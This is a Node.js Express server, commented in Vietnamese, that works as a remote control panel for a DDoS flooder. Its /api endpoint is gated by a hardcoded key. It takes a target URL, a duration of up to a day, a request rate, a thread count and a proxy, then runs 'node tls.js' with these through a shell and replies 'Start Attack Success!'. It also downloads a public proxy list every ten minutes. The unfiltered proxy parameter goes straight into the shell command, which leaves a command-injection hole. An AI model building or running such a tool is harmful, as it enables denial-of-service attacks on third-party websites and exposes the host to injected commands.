const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');

const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

const api_port = 4000; // Cổng API
const api_key = "quangdev"; // Khóa API của bạn

const app = express();
app.use(express.json());

// Hàm kiểm tra URL
const isValidUrl = (url) => urlRegex.test(url) && !blackList.some(char => url.includes(char));

// Hàm kiểm tra số và giới hạn
const isValidNumber = (value, max = Infinity) => !isNaN(value) && value >= 0 && value <= max;

app.get(`/api`, async (req, res) => {
    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;

    // Kiểm tra API key
    if (apiKey !== api_key) {
        return res.json({ status: 500, data: `Khóa API không hợp lệ` });
    }

    // Kiểm tra các tham số
    if (!url || !isValidUrl(url)) return res.json({ status: 500, data: `URL không hợp lệ` });
    if (!isValidNumber(time, 86400)) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
    if (!isValidNumber(rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
    if (!isValidNumber(thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
    if (!proxy) return res.json({ status: 500, data: `Proxy không được để trống` });

    // Ghi log URL, thời gian, rate và threading
    console.log(`Url: ${url} Time: ${time} Rate: ${rate} Threading: ${thea} đang thực hiện Start Attack`);

    // Chuẩn bị lệnh gọi tệp flooder.js
    const command = `node tls.js ${url} ${time} ${rate} ${thea} ${proxy}`;

    // Gửi phản hồi trạng thái ban đầu ngay lập tức
    res.json({
        status: 200,
        message: 'Start Attack Success!',
        data: { url, time, rate, thea, proxy }
    });

    // Thực thi lệnh sau khi gửi phản hồi
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Lỗi khi thực thi lệnh: ${stderr}`);
            return;
        }

        console.log(`Gửi yêu cầu thành công: ${stdout}`);
    });
});

// Route tải proxy tự động
async function downloadProxy() {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
    } catch (error) {
        console.error(`Lỗi khi tải proxy: ${error.message}`);
    }
}

// Lên lịch tải proxy mỗi 10 phút (600000 ms)
setInterval(downloadProxy, 600000);

// Tải proxy lần đầu khi server khởi động
downloadProxy();

app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
